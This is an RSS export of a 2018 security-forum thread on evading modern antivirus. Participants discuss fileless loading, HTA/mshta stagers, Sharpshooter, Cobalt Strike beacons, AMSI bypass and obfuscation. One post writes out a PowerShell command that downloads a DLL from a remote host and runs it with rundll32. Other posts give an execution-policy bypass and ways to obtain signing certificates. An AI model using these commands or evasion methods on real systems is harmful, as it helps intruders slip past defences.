<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>New AV Bypass techniques</title>
    <link>https://0x00sec.org/t/new-av-bypass-techniques/9608</link>
    <description>Nowadays. Old and traditional bypass technics used by malware failed in front of modern AV software.
This is due to the whitelisting strategy adopted by antivirus solutions (AV won&#39;t let an unsigned binary to be executed). 
And also with the runtime monitoring now in effect.
So I wonder how on the other side, bypass techniques can be improved to face new detection mechanism.</description>
    
    <lastBuildDate>Fri, 23 Nov 2018 16:16:59 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/23</link>
        <pubDate>Tue, 18 Dec 2018 23:02:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-23</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[occupi]]></dc:creator>
        <description><![CDATA[
            <p>A small-to-medium business appears to be pwned by ransomware every day if you subscribe to subreddits like /r/ransomware, and almost every time it’s via a phishing attack. You’re so right about that vector, it isn’t going away anytime soon. Never doubt the power of human ignorance/apathy.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/22</link>
        <pubDate>Fri, 23 Nov 2018 16:16:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-22</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p>Thank youu <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>  =D !!</p>
<p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> what about starting a project …</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/21</link>
        <pubDate>Thu, 22 Nov 2018 23:06:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-21</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>As for HTA blocking, who knows, we’ll find a new way, there is always a way.</p>
<p>There are many LOLBINS, or Living Off The Land BINaries, you can find a list of these here:</p>
<p><a href="http://lolbas-project.com/" class="onebox" target="_blank">http://lolbas-project.com/</a></p>
<p>Windows is full of interesting code execution methods, and it generally helps to examine email malware, ransomware and crypto miners that exist today, and try and see how they are getting code exec. Perhaps eventually phishing will taper off, but then we’ll simply move our attention to new methods.</p>
<p>We have a long way to go before phishing stops being a reliable attacker vector. You also need to keep in mind, that a LOT of organizations don’t even update their software regularly, windows updates are known to break things, and so even if Microsoft do stop allowing HTA and Javascript files, it will take 10 years+ before all organizations start to adopt that standard, or update their systems to that level.</p>
<p>You need to understand that organizations with less than 200 employees don’t even have competent IT staff, let alone security personnel.</p>
<p>This is why we need to do our best to educate non-security professionals, such as developers and IT admins, they’re the future of our security landscape, and they will help to patch the gap while organizations are still learning that security is important, and needs to be budgeted for.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/20</link>
        <pubDate>Wed, 21 Nov 2018 13:20:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-20</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Hmmm - I don’t think you could reflectively infect a pe file in memory using JS/Com objects, however you could use javascript as a stager, that could pull and run a powershell script, such as:</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank">PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></h4>
<pre><code class="lang-ps1">function Invoke-ReflectivePEInjection
{
&lt;#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
</code></pre>

  This file has been truncated. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank">show original</a>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>And then reflectively inject. However I don’t know if this would be detected or not with windows defender. What is your goal in doing this? If you want to execute code, then you can do that with C# stagers, like sharpshooter, you just need raw shellcode.</p>
<p>And yes, malware authors sign their binaries all the time. Sometimes they just register under a false identity as a developer, or they steal certificates from other places. If you pay enough in the shady parts of the internet, you can buy certificates.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/19</link>
        <pubDate>Wed, 21 Nov 2018 13:13:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-19</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p>It’s really awesome, but at this stage, you already have a process … so it is useful to bypass runtime detection .</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/18</link>
        <pubDate>Wed, 21 Nov 2018 10:00:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-18</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p>Thank you so much !!<br>
<a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>  is there any option to reflectively inject a pe file in memory using Javascript / COM objects?<br>
So I understand that nowadays, the only way to get the job than in a stealthy way is through an HTA file?<br>
Is that true? What if AV softwares start blocking and deleting HTA files ?<br>
And do malware authors sign their binary?</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/17</link>
        <pubDate>Wed, 21 Nov 2018 09:57:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-17</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Ah then it must be that specific signature then.</p>
<p>I haven’t tested my own file-less project against Defender + AV yet. I’m sure it might be detected since it was not initially designed with that consideration in mind but it would be nice to test it in a VM. Maybe I’ll try it for fun and add the results into the report. ¯\_(ツ)_/¯</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/16</link>
        <pubDate>Tue, 20 Nov 2018 23:59:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-16</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[occupi]]></dc:creator>
        <description><![CDATA[
            <p>The undetectable C# reverse shell blog post you linked also seems to indicate that you can get away with a lot in a C# program. 1/32 detections for a straight reverse shell .exe is pretty good.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/15</link>
        <pubDate>Tue, 20 Nov 2018 19:49:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-15</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I made a cobalt strike beacon today with sharpshooter HTA and it worked great.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/14</link>
        <pubDate>Tue, 20 Nov 2018 19:42:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-14</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Last I tried to form a polyglot HTA using <code>mshta.exe</code> in an LNK, Defender wiped it out as soon as I created it.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/12</link>
        <pubDate>Tue, 20 Nov 2018 14:40:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-12</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Yes - kind of.</p>
<p>Executables are blocked in emails everywhere, and even technically inept people are beginning to learn that if somebody sends you an exe, it’s probably malicious.</p>
<p>However, if you do want to run an executable, you need to sign the executable,  because things like windows defender + chrome will pickup on unsigned exe’s, and block them. This is similar to how MacOS handles .app files that are unsigned.</p>
<p>As for powershell, that’s pretty much dead now too. The main way forward now is vbscript with HTA files, as well as javascript files. Those are still alive and kicking, especially with things like sharpshooter.</p>
<p><a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>, I do not thing mshta is detected by defender, I am going to test this again today but with cobalt strike beacons.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/11</link>
        <pubDate>Tue, 20 Nov 2018 13:47:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-11</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[r3llun]]></dc:creator>
        <description><![CDATA[
            <p>I haven’t experimented on it but I consider this is a good read to get a grasp on how things work from the inside. <a href="https://breakdev.org/defeating-antivirus-real-time-protection-from-the-inside/" rel="nofollow noopener">Defeating Antivirus Real-time Protection From The Inside</a></p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/10</link>
        <pubDate>Tue, 20 Nov 2018 11:10:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-10</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This isn’t file-less because you’re dropping a file to disk. If you want to file-lessly execute a traditional PE file using PowerShell, you can reflectively load it using a module like <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection</a>. I believe <code>mshta</code> is flagged by Defender so I assume that would not be a very easy method.</p>
<p>I don’t believe that AV on the average user’s computer would use such strict policies such as whitelisting and allowing on signed executables because of the nature of software sharing on Windows systems.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/9</link>
        <pubDate>Tue, 20 Nov 2018 00:14:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-9</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> Thank you!! I succeed with Sharpshooter, I’ve got a meterpreter session combining some tricks. But the main question is does the exe malwares are dead in 2018? is this the only way malwares authors can spread their code?  what do you think?</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/8</link>
        <pubDate>Mon, 19 Nov 2018 23:57:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-8</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Have you tried using sharpshooter?</p>
<aside class="quote quote-modified" data-post="1" data-topic="8178">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar">
    <a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/malware/56"><span class="badge-category-bg" style="background-color: #F7941D;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Malware</span></a>
  </div>
  <blockquote>
    Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo
Hi! I hope you’re well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you’re new to security, or you’re just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I’m here to show that it really isn’t hard, and you don’t need Cobalt Strike to do it…
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/7</link>
        <pubDate>Mon, 19 Nov 2018 11:54:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-7</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> <a class="mention" href="https://0x00sec.org/u/baud">@Baud</a> <a class="mention" href="https://0x00sec.org/u/lkw">@lkw</a> even with fileless malwares … for example when I use a simple :</p>
<pre><code class="lang-auto">powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.5:8080/apt.dll', 'C:\ProgramData\a.dll') ;copy 'C:\ProgramData\a.dll' 'C:\ProgramData\x.dll' ;rundll32 C:\ProgramData\x.dll,Run "
</code></pre>
<p>The dll is downloaded but the AV (in this case Trend Micro) prevent rundll32 from running the dll .<br>
Even a simple :</p>
<pre><code class="lang-auto">mshta.exe javascript:"&lt;script language=vbscript&gt;createobject(\"WScript.Shell\").run(\"rcalc.exe\")\r\nclose()&lt;/script&gt;
</code></pre>
<p>trigger the anti-virus .</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/6</link>
        <pubDate>Mon, 19 Nov 2018 09:28:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-6</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[lkw]]></dc:creator>
        <description><![CDATA[
            <p>I’m not an expert, but I know pentesters that do this.</p>
<aside class="quote group-VIP" data-username="Baud" data-post="3" data-topic="9608">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/baud/40/5512_2.png" class="avatar"> Baud:</div>
<blockquote>
<p>This kind of malicious code works by being passed on to a trusted program, typically PowerShell,</p>
</blockquote>
</aside>
<p>While they don’t need to be signed by default I think this can be changed, but I don’t remember where.</p>
<p>I think one of the main things people I know use is <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> to obfuscate powershell scripts. For actually running the script <a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356">XSL and HTA</a> work well.</p>
<p>There are things you can do to stop this working as well; like enabling <a href="https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script">script block logging</a>, using <a href="https://blogs.msdn.microsoft.com/powershell/2017/11/02/powershell-constrained-language-mode/">constrained language mode</a> and disabling powershell 1 (you can bypass the constrained mode by running the script with powershell 1 instead of a later one).</p>
<p>While by default powershell’s execution policy will not allow scripts it is trivial to bypass with something like</p>
<pre><code class="lang-auto">powershell.exe -exec bypass
</code></pre>
<p>There is also a script called <a href="https://github.com/danielbohannon/Revoke-Obfuscation">Revoke-Obfuscation</a> which tries to detect obfuscation to block scripts using it.</p>
<p>There is also the anti malware scan interface being used by windows defender and others, but that can be <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf">bypassed</a>.</p>
<p>It might also be worth pointing out that Microsoft is doing some <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/configure-block-at-first-sight-windows-defender-antivirus">machine learning cloud stuff</a> with windows defender that can be used (only in the buisness versions iirc)  this also works with powershell scripts and office macros.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/5</link>
        <pubDate>Mon, 19 Nov 2018 09:11:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-5</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Am I right in saying you’re talking about this?</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
      <a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener" title="02:20PM - 06 August 2020">Medium – 6 Aug 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dba6c5bca5844abc412903ca5ab3e1450fea2171.png" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener">Undetectable C# &amp; C++ Reverse Shells</a></h3>

<p>Technical overview of different way to spawn a reverse shell on a victim machine</p>

  <p><span class="label1">Reading time: 7 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/4</link>
        <pubDate>Mon, 19 Nov 2018 08:26:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-4</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[Baud]]></dc:creator>
        <description><![CDATA[
            <p>The easiest option I can think of is fileless malware: malicious code that is loaded into memory without being stored on the disk. This kind of malicious code works by being passed on to a trusted program, typically PowerShell, through a delivery method that is usually a web page containing JavaScript code or sometimes even a Flash application, if not even through an Office macro, to name an attack vector we’re all familiar with.</p>
<p>By letting this trusted executable run the actual code instead of downloading a remote malicious program on the target machine you bypass the signing issue and won’t have to worry about scan-time detection, at least if you’re not using macros, which are stored inside the legit file and can thus be detected with specific AV rules if set properly, even though there are ways to make up for this through some clever obfuscation (maybe I could make a thread about this?).</p>
<p>As for runtime monitoring and heuristic detection, all I can say is it depends on how these security measures are implemented: you can’t set up an environment where every single operation triggers a warning, it would be impractical for anyone who wishes to use it, so you need to leave a margin of trust to the operations a user is allowed to perform without firing the alarm, and because of this there will always be the chance of someone abusing it or finding a way to circumvent it altogether. As a consequence a lot of malware is able to perform some sort of check to detect running AVs, virtual environments and sandboxes, and are able to behave accordingly, for example by using several tricks to convince the AV that the process is harmless.</p>
<p>Antivirus evasion is not an easy subject and I’m not an expert myself so if you want to learn much more about older and present techniques I redirect you to <a href="https://www.amazon.com/Antivirus-Hackers-Handbook-Joxean-Koret/dp/1119028752?tag=0x00sec03-20" rel="nofollow noopener">this</a> very interesting book, it’s a great read.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/3</link>
        <pubDate>Mon, 19 Nov 2018 02:01:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-3</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This is news to me, from which source did you get this information? Are you talking about AVs in general or specific versions? <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:"></p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/2</link>
        <pubDate>Mon, 19 Nov 2018 00:59:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-2</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
      <item>
        <title>New AV Bypass techniques</title>
        <dc:creator><![CDATA[BlackYenii]]></dc:creator>
        <description><![CDATA[
            <p>Nowadays. Old and traditional bypass technics used by malware failed in front of modern AV software.<br>
This is due to the whitelisting strategy adopted by antivirus solutions (AV won’t let an unsigned binary to be executed).<br>
And also with the runtime monitoring now in effect.<br>
So I wonder how on the other side, bypass techniques can be improved to face new detection mechanism.</p>
          <p><a href="https://0x00sec.org/t/new-av-bypass-techniques/9608/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/new-av-bypass-techniques/9608/1</link>
        <pubDate>Sun, 18 Nov 2018 23:02:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-9608-1</guid>
        <source url="https://0x00sec.org/t/new-av-bypass-techniques/9608.rss">New AV Bypass techniques</source>
      </item>
  </channel>
</rss>
